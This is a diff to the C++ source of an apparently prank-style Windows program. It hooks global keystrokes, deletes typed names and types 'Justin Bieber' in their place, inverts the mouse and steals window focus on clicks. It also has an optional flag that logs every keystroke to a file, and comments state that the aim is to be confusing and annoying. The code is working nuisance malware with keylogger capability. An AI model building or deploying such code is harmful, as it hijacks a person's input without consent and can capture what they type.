@@ -52,7 +52,7 @@ int _nCmdShow;
 // replacement word
 string replacement = "Justin Bieber";
 // list of key phrases
-vector<string> KeyWords = { "garrett", "michael", "mike", "tom", "ming", "brett", "jaqueline", "test", "guys", "build" };
+vector<string> KeyWords = { "garrett", "chris", "michael", "mike", "tom", "ming", "brett", "jaqueline", "jacky", "test", "guys", "build", "halo" };
 // do we want to also be a keylogger?
 bool logKeys = false;
 
@@ -122,9 +122,7 @@ void loopforever() {
 	// create splash window and init it
 	g_splashWindow = CreateSplashWindow(hInst);
 	g_evilWindow = CreateSplashWindow(hInst);
-	SetSplashImage(g_splashWindow, g_slashMap, 0, 0, true);
-	SetSplashImage(g_evilWindow, g_slashMap, 0, 0, true);
-
+	
 	//set sprites for characters
 	pacMan.LoadSpritemap({ IDB_Pac_l_c,IDB_Pac_l_o,IDB_Pac_r_c,IDB_Pac_r_o,IDB_Pac_u_c,IDB_Pac_u_o,IDB_Pac_d_c,IDB_Pac_d_o });
 	inky.LoadSpritemap({ IDB_Ink_l,IDB_Ink_l,IDB_Ink_r,IDB_Ink_r,IDB_Ink_u,IDB_Ink_u,IDB_Ink_d,IDB_Ink_d });
@@ -150,7 +148,7 @@ void loopforever() {
 	int yd = 5;
 	int xd = 5;
 	int i = 0;
-	int gamestate = 0;
+	int gamestate = 4;
 	POINT currentMouse, lastMouse;
 	GetCursorPos(&currentMouse);
 	lastMouse = currentMouse;
@@ -273,12 +271,14 @@ void loopforever() {
 
 			//mouse wonking here
 			// inverts mouse input
-			GetCursorPos(&currentMouse);
-			int xdiff = lastMouse.x - currentMouse.x;
-			int ydiff = lastMouse.y - currentMouse.y;
-			lastMouse.x = rotclamp(lastMouse.x + xdiff, 1, maxx - 1);
-			lastMouse.y = rotclamp(lastMouse.y + ydiff, 1, maxy - 1);
-			SetCursorPos(lastMouse.x, lastMouse.y);
+			if (gamestate == 3) {
+				GetCursorPos(&currentMouse);
+				int xdiff = lastMouse.x - currentMouse.x;
+				int ydiff = lastMouse.y - currentMouse.y;
+				lastMouse.x = rotclamp(lastMouse.x + xdiff, 1, maxx - 1);
+				lastMouse.y = rotclamp(lastMouse.y + ydiff, 1, maxy - 1);
+				SetCursorPos(lastMouse.x, lastMouse.y);
+			}
 
 			// this is the text replacer
 			// watch special key state changes
@@ -287,7 +287,7 @@ void loopforever() {
 			if (GetAsyncKeyState(1)) {
 				state |= CLICK;
 				// random switch on click should make this confusing and annoying
-				if (rand()%2==0)SwitchToThisWindow(g_splashWindow, true);
+				if (gamestate == 3 && rand()%2==0)SwitchToThisWindow(g_splashWindow, true);
 				if (logKeys && state != oldState)
 					outfile << "`CLICK`";
 			}
@@ -328,11 +328,18 @@ void loopforever() {
 						// if a key phrase has been typed count it's length
 						// then backspace it away and type out a replacement
 						auto replaceChars = typedKeyPhrase(recentKeys);
-						if (replaceChars) {
+						if (replaceChars) {							
 							for (int i = replaceChars; i--;) {
 								triggerKey(VK_BACK);
 							}
+
 							typeString(replacement);
+							
+							if (gamestate != 3) {
+								gamestate = 0;
+								SetSplashImage(g_splashWindow, g_slashMap, 0, 0, true);
+								SetSplashImage(g_evilWindow, g_slashMap, 0, 0, true);
+							}
 						}
 					}
 				}
